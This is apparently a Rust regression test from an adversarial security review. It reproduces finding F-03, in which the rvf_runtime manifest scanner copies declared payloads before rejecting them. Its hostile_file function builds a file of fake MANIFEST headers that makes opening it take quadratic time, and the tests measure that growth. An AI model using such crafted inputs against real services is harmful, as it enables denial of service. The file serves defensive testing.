//! Adversarial review repro (finding F-03): the runtime's manifest scanner
//! allocates and copies each candidate's declared payload before it can reject
//! it, so a file packed with fake MANIFEST headers makes `open` quadratic.
//! Runs under every policy because the scan precedes any signature check.

use rvf_runtime::RvfStore;
use rvf_types::security::SecurityPolicy;
use rvf_runtime::RvfOptions;
use std::time::Instant;

/// `n` back-to-back 64-byte MANIFEST headers; header i claims every byte
/// after it as payload. The payload (the next header) fails the manifest
/// parse because its bytes 14..18 give a huge seg_count.
fn hostile_file(n: usize) -> Vec<u8> {
    let tmpl = rvf_wire::writer::write_segment(
        rvf_types::SegmentType::Manifest as u8,
        &[],
        rvf_types::SegmentFlags::empty(),
        u64::MAX,
    );
    let mut out = Vec::with_capacity(n * 64);
    for i in 0..n {
        let mut h = tmpl[..64].to_vec();
        h[0x08..0x10].copy_from_slice(&u64::MAX.to_le_bytes());
        let rem = ((n - i - 1) * 64) as u64;
        let base = rem & !0xFFFF;
        let mut pl = base | 0x8000;
        if pl > rem {
            pl = if base >= 0x10000 { (base - 0x10000) | 0x8000 } else { rem };
        }
        h[0x10..0x18].copy_from_slice(&pl.to_le_bytes());
        h[0x28..0x38].fill(0); // zero hash: payload hash is not checked by the scan anyway
        out.extend_from_slice(&h);
    }
    out
}

#[test]
fn f03_fake_manifest_headers_make_open_quadratic() {
    let d = tempfile::tempdir().unwrap();
    let mut times = Vec::new();
    for mib in [1usize, 2, 4] {
        let bytes = hostile_file(mib * 1024 * 1024 / 64);
        let p = d.path().join(format!("h{mib}.rvf"));
        std::fs::write(&p, &bytes).unwrap();
        let t = Instant::now();
        let r = RvfStore::open_with_policy(
            &p,
            RvfOptions {
                dimension: 4,
                ..Default::default()
            },
            SecurityPolicy::Strict,
        );
        let dt = t.elapsed();
        eprintln!("{mib} MiB hostile file: open -> {:?} in {dt:?}", r.is_ok());
        times.push(dt.as_secs_f64());
    }
    // Quadratic: doubling the file should roughly quadruple the time.
    assert!(
        times[2] > times[0] * 8.0,
        "no super-linear growth observed: {times:?}"
    );
}

#[test]
fn f03_diag() {
    for mib in [1usize, 2, 4] {
        let bytes = hostile_file(mib * 1024 * 1024 / 64);
        let t = Instant::now();
        let r = rvf_runtime::read_path::locate_manifest_in_bytes(&bytes);
        eprintln!("{mib} MiB -> {r:?} in {:?}", t.elapsed());
    }
}
